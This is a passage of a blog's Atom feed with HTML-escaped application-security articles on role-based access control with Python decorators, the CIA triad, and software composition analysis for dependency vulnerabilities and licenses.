        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The is_author function then is pretty straight forward:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;is_author&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;article&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Article&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;article&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;author_id&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;More complicated is the design of attribute_required , but in principle, it works similarly to the decorator above.&lt;/p&gt;
&lt;h3 id="why-rbacabac-with-decorators-is-great"&gt;Why RBAC/ABAC with Decorators is great&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s say you build the e-commerce website eBay. One entity is an auction. It has various attributes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Auction ID&lt;/strong&gt;: Set by the system, immutable&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Seller ID&lt;/strong&gt;: Set by the system, immutable&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Title&lt;/strong&gt;: Set by the user, immutable&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Description text&lt;/strong&gt;: Set by seller, editable by seller&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You could implement the change_descripion_text function like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;change_descripion_text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;auction&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Auction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Auction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;current_user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;auction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;seller_id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="n"&gt;PermissionDeniedException&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"Only the seller may edit"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then you realize that admins should always be able to change it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;change_descripion_text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;auction&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Auction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Auction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;is_seller&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;current_user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;auction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;seller_id&lt;/span&gt;
    &lt;span class="n"&gt;is_admin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;is_admin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;current_user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;is_seller&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;is_admin&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="n"&gt;PermissionDeniedException&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"Only the seller may edit"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And you might realize that you also should check for moderators. And maybe you
allow companies to sell as well. So not only the person who put it in the shop
but also moderators of that company should be able to adjust description texts.
And then you realize that there is metadata such as weight/volume of the item
as well. The mentioned access control just has too many places in which the
developers can get things wrong.&lt;/p&gt;
&lt;p&gt;Instead, you can use roles. For example, seller sounds like a role. The roles
can be context-dependent.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nd"&gt;@requires_role&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;SellerRole&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;AdminRole&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;ModeratorRole&lt;/span&gt;&lt;span class="p"&gt;()])&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;change_descripion_text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;auction&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Auction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Auction&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="tricks-to-make-access-control-effective_1"&gt;Tricks to make Access Control Effective&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Photo by Jaimie Harmsen on Unsplash" src="https://cdn-images-1.medium.com/max/8064/0*qLPyfhzI9rq7ObkR"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@jaimie_96?utm_source=medium&amp;amp;utm_medium=referral"&gt;Jaimie Harmsen&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The case of creating web services is certainly most interesting to most
readers, so let&amp;rsquo;s focus on that. Access control is enforced in the backend and
hence typically on the API level. It&amp;rsquo;s most of the time about which users can
call which API endpoints, but sometimes it can be more complicated. For
example, in a social network, every user might be allowed to get the list of
friends of another user. But you might only see the birthday if you are a
friend of that user yourself. Hence some endpoints might be callable but
deliver different data depending on the caller.&lt;/p&gt;
&lt;p&gt;For now, let&amp;rsquo;s just focus on the simple case with a REST API. If you have the
permission to call an endpoint with a given set of parameters, then you will
always get the same result. No matter who you are / which role you have. The
only right we care about for now is &amp;ldquo;can call&amp;rdquo;. Our subjects are &amp;ldquo;users&amp;rdquo; and
our objects are the combination (route, parameter).&lt;/p&gt;
&lt;p&gt;In such a scenario, you will typically want to make a role-based system. There are some simple principles that can help:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Deny by default&lt;/strong&gt;: It&amp;rsquo;s easy to add a new route somewhere. Make sure that
  people don&amp;rsquo;t leak data by not allowing any access whatsoever by default. Make
  them write down which roles are allowed.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DRY&lt;/strong&gt;: Don&amp;rsquo;t repeat yourself. Implement the access control code once and
  make it simple to check without copy-pasting the implementation. In Python /
  Flask, you typically want a decorator over your function to denote the
  allowed roles.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Least privilege&lt;/strong&gt;: Don&amp;rsquo;t give people roles they don&amp;rsquo;t need. Don&amp;rsquo;t give
  roles permissions they don&amp;rsquo;t need. Remove roles from people if they leave &amp;mdash;
  no matter if they leave the job or just that role. The fewer people have
  access, the less potential for issues.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;YAGNI&lt;/strong&gt;: Designing good software is hard. Some software engineers tend to
  think 10 steps ahead and build the system for potential future use cases. Of
  course, sometimes you already know that topics are on the table. Otherwise,
  &lt;strong&gt;y&lt;/strong&gt;ou &lt;strong&gt;a&lt;/strong&gt;in&amp;rsquo;t &lt;strong&gt;g&lt;/strong&gt;onna &lt;strong&gt;n&lt;/strong&gt;eed &lt;strong&gt;i&lt;/strong&gt;t (YAGNI). Build stuff when you
  need it. That might mean a bit more work and refactoring parts of the
  software. That&amp;rsquo;s ok.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Minimize attack surface&lt;/strong&gt;: Whenever you can, try to remove features and
  outdated code. Code you delete doesn&amp;rsquo;t need to get maintained. It cannot have
  security issues.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Clustering objects around Rights&lt;/strong&gt;: If you have a few types of
  rights/roles, you could group your objects around that. For example, if your
  objects are files, your roles are &amp;ldquo;owner&amp;rdquo;, &amp;ldquo;group&amp;rdquo;, &amp;ldquo;other&amp;rdquo; and the rights
  are &amp;ldquo;read&amp;rdquo; / &amp;ldquo;write&amp;rdquo; / &amp;ldquo;execute&amp;rdquo;, then this grouping is a directory with
  Unix-style permissions. If you&amp;rsquo;re thinking about web services, your objects
  could be routes, the rights would be &amp;ldquo;call&amp;rdquo; and the roles would be
  &amp;ldquo;anonymous&amp;rdquo;, &amp;ldquo;registered&amp;rdquo;, &amp;ldquo;admin&amp;rdquo;. Then you can organize your code in such a
  way that no file contains routes for anonymous users AND admin users. If you
  do that, then human errors become way easier to exclude. In a review, if
  suddenly an admin-type route appears in a &amp;ldquo;normal user&amp;rdquo; file, this is easy to
  spot.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="credits"&gt;Credits&lt;/h2&gt;
&lt;p&gt;Steven Gorden summarized parts of the terminology really well:&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/aFdE_5CfLU4" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category><category term="OWASP"></category></entry><entry><title>The Cyber Security Triad</title><link href="https://martin-thoma.com/https://medium.com/plain-and-simple/the-cyber-security-triad-df9911f85955" rel="alternate"></link><published>2020-12-11T20:00:00+01:00</published><updated>2020-12-11T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-11:/https://medium.com/plain-and-simple/the-cyber-security-triad-df9911f85955</id><summary type="html">&lt;p&gt;&lt;img alt="Photo by Tobias Tullius on Unsplash" src="https://cdn-images-1.medium.com/max/9824/0*y0XhVZB7bT94OK4T"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@tobiastu?utm_source=medium&amp;amp;utm_medium=referral"&gt;Tobias Tullius&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The Cyber Security Triad, also called the CIA triad, is a set of three goals:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality&lt;/strong&gt;: Information or resources can only be accessed by
  authorized parties.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Integrity&lt;/strong&gt;: Information can only be added, edited, or removed by
  authorized parties.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt;: Systems are available to their ‚Ä¶&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="Photo by Tobias Tullius on Unsplash" src="https://cdn-images-1.medium.com/max/9824/0*y0XhVZB7bT94OK4T"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@tobiastu?utm_source=medium&amp;amp;utm_medium=referral"&gt;Tobias Tullius&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The Cyber Security Triad, also called the CIA triad, is a set of three goals:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality&lt;/strong&gt;: Information or resources can only be accessed by
  authorized parties.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Integrity&lt;/strong&gt;: Information can only be added, edited, or removed by
  authorized parties.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt;: Systems are available to their users according to the
  service level agreements (SLAs).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="email-example"&gt;Email Example&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality&lt;/strong&gt;: Only the sender and the receiver can read an email.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Integrity&lt;/strong&gt;: Only you can delete emails you received. Nobody can edit the
  emails you received.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt;: You can read emails in your inbox whenever you want.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="whatsapp-example"&gt;WhatsApp Example&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s ignore groups for the moment.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality&lt;/strong&gt;: Only the sender and the receiver can read a message.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Integrity&lt;/strong&gt;: Only you can delete messages you received, with the exception
  of messages you haven&amp;rsquo;t read / which are not older than a certain time.
  Nobody can edit the messages you received.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt;: You can read your messages whenever you want.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Please note that the integrity criterion is different for WhatsApp compared to
Email! This shows that the meaning of the criterion depends on the context.
Similarly, availability in many business applications can mean &amp;ldquo;available at
typical business hours&amp;rdquo;.&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="Cybersecurity"></category></entry><entry><title>Software Composition Analysis (SCA)</title><link href="https://martin-thoma.com/sca/" rel="alternate"></link><published>2020-12-04T20:00:00+01:00</published><updated>2020-12-04T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-04:/sca/</id><summary type="html">&lt;p&gt;The job as a software developer is pretty crazy: You need to learn constantly
about new technologies, understand topics within the domain you&amp;rsquo;re working,
estimate how long it will take to build stuff you have never built before,
explain issues to people who have absolutely no clue. On top ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;The job as a software developer is pretty crazy: You need to learn constantly
about new technologies, understand topics within the domain you&amp;rsquo;re working,
estimate how long it will take to build stuff you have never built before,
explain issues to people who have absolutely no clue. On top of all that, you
need to protect your software system against attackers. But the attackers are
usually not a problem &amp;mdash; until they are. This means it can happen that security
receives little attention as it seems not to provide direct value. And when the
value becomes apparent, it&amp;rsquo;s too late.&lt;/p&gt;
&lt;p&gt;Considering that developers are so busy with many other topics and might have a
hard time to justify the need for security improvements, the security
improvements need to be part of the normal workflow. You want to have something
running completely automatically which takes care of that for you.&lt;/p&gt;
&lt;p&gt;There are many different topics in security and many different tools. One group
of tools do so-called &lt;em&gt;software composition analysis&lt;/em&gt; &amp;mdash; SCA in short. After
reading this article you will understand what SCA is and how it helps you.&lt;/p&gt;
&lt;h2 id="problem-1-malicious-third-party-software"&gt;Problem 1: Malicious Third-Party Software&lt;/h2&gt;
&lt;p&gt;Software that is written to cause harm can get into your dependencies. Either
by a typo and &lt;a href="https://en.wikipedia.org/wiki/Typosquatting"&gt;typosquatting&lt;/a&gt;
attacker or by a trojan horse. A trojan horse is software that seems to be
useful but does something else.&lt;/p&gt;
&lt;h2 id="problem-2-vulnerable-third-party-software"&gt;Problem 2: Vulnerable Third-Party Software&lt;/h2&gt;
&lt;p&gt;The more complex software becomes, the harder it is to have all relevant
aspects of it in your mind. This can lead to vulnerabilities &amp;mdash; especially with
many contributors.&lt;/p&gt;
&lt;h2 id="problem-3-licenses-of-third-party-software"&gt;Problem 3: Licenses of Third-Party Software&lt;/h2&gt;
&lt;p&gt;You can also run into legal issues. As an organization, you want to make your
mind up about which licenses are acceptable. The acceptable ones will be in an
allowlist. Then you want to automatically check any dependency regularly
against this allowlist.&lt;/p&gt;
&lt;p&gt;Typical licenses are MIT, BSD, Apache 2.0, LGPL, GPL, MPL.&lt;/p&gt;
&lt;p&gt;Have a look at &lt;a href="https://tldrlegal.com/"&gt;tldrlegal.com&lt;/a&gt; to get a quick overview.&lt;/p&gt;
&lt;h2 id="how-sca-works"&gt;How SCA works&lt;/h2&gt;
&lt;p&gt;Checking for malicious and vulnerable third-party packages is simple:
Blocklists. If a version of a package (or the complete package) is known to
cause problems, it gets on a blocklist. SCA tools can check the blocklists and
prevent you from installing problematic software.&lt;/p&gt;
&lt;p&gt;For the licenses, you need to have a way to extract the licenses from a
package. Some important things to consider:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Package authors can add alternative licenses&lt;/li&gt;
&lt;li&gt;Package authors can add multiple licenses which all need to be fulfilled&lt;/li&gt;
&lt;li&gt;Package authors can (technically) not give any license &amp;mdash; that means you
  cannot use it!&lt;/li&gt;
&lt;li&gt;Package authors can give inconsistent licenses, e.g. in Python, there are at
  least 3 different common ways where you can denote the license.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="prerequisite-bill-of-materials-bom"&gt;Prerequisite: Bill of Materials (BOM)&lt;/h2&gt;
&lt;p&gt;You need to know which third-party software you are using. For that, you create
a so-called &lt;em&gt;Bill of Materials&lt;/em&gt;. Sounds fancy, but it really is just a list of
the software you use. The programming languages typically come already with
solutions for that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Java&lt;/strong&gt;: pom.xml (see
  &lt;a href="https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html"&gt;dependencies&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;a href="https://classic.yarnpkg.com/en/docs/yarn-lock/"&gt;yarn.lock&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PHP&lt;/strong&gt;: &lt;a href="https://getcomposer.org/doc/02-libraries.md#lock-file"&gt;composer.lock&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: requirements.txt files with transitively-pinned dependencies,
  e.g. via pip-compile from &lt;a href="https://pypi.org/project/pip-tools"&gt;pip-tools&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;a href="https://bundler.io/rationale.html"&gt;Gemfile.lock&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Rust&lt;/strong&gt;: Cargo.tom &amp;mdash; I&amp;rsquo;m uncertain if that contains transitive dependencies
  (see
  &lt;a href="https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html"&gt;dependencies&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Please let me know about how this is called in other languages &amp;mdash; I will expand
this list then.&lt;/p&gt;
&lt;h2 id="examples-for-sca-tools"&gt;Examples for SCA Tools&lt;/h2&gt;
&lt;p&gt;Free solutions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;a href="https://classic.yarnpkg.com/en/docs/cli/audit/"&gt;yarn audit&lt;/a&gt;
  for vulnerabilities and &lt;a href="https://classic.yarnpkg.com/en/docs/cli/licenses/"&gt;yarn
  licenses&lt;/a&gt; + scripting
  around it for licenses.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;a href="https://pypi.org/project/safety/"&gt;safety&lt;/a&gt; for vulnerabilities,
  &lt;a href="https://pypi.org/project/pip-licenses/"&gt;pip-licenses&lt;/a&gt; for licenses.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Commercial solutions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.blackducksoftware.com/"&gt;Blackduck&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dependabot.com/"&gt;Dependabot&lt;/a&gt;: I&amp;rsquo;ve seen this on Github some times.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://snyk.io/product/open-source-security-management/"&gt;Snyk&lt;/a&gt; for
  vulnerabilities: You can see it in Github pretty often. It&amp;rsquo;s free for
  open-source software.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="summary"&gt;Summary&lt;/h2&gt;
&lt;p&gt;Software Composition Analysis (SCA) tools can help you a lot and usually stay
in the background. Integrate them in your Continuous Integration (CI) pipeline,
run them regularly as a scheduled task. In most cases, you don&amp;rsquo;t have to do
anything. But when the tool complains, it is important.&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
